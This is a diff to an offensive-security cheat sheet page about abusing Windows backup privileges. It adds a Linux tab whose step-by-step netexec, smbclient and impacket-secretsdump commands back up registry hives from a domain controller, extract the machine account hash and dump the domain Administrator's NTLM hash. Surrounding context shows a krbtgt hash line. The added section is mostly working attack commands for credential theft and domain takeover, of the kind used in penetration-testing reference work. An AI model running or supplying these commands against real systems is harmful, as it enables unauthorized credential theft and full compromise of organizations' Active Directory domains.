@@ -1,6 +1,5 @@
 ---
 title: "SeBackupPrivilege/SeRestorePrivilege"
-date: 2025-8-1
 tags: ["Credential Dumping", "File System", "SeBackupPrivilege", "SeRestorePrivilege", "Windows", "Backup Operators", "Diskshadow", "SAM", "SECURITY", "SYSTEM", "ntds.dit"]
 ---
 
@@ -197,6 +196,39 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
 
 ### Abuse #4: BackupOperatorToDA
 
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+#### 1. Backup SAM, SECURITY, SYSTEM
+
+```console
+# Password
+nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M backup_operator
+```
+
+#### 2. Get SAM, SECURITY, SYSTEM from SYSVOL
+
+```console
+# Password
+smbclient  \\\\<DC>\\SYSVOL\\ -U '<DOMAIN>/<USER>%<PASSWORD>'
+```
+
+#### 3. Get Machine Account NTLM
+
+```console
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
+#### 4. Secrets Dump
+
+```console
+impacket-secretsdump '<DOMAIN>/<DC_HOSTNAME>$@<DC>' -hashes :<HASH> -just-dc-user Administrator
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
 #### 1. Host a SMB Server (In Linux)
 
 ```console
@@ -224,6 +256,8 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
 <small>*Ref: [BackupOperatorToDA.exe](https://github.com/mpgn/BackupOperatorToDA)*</small>
+
+{{< /tabcontent >}}
 
 ---
 
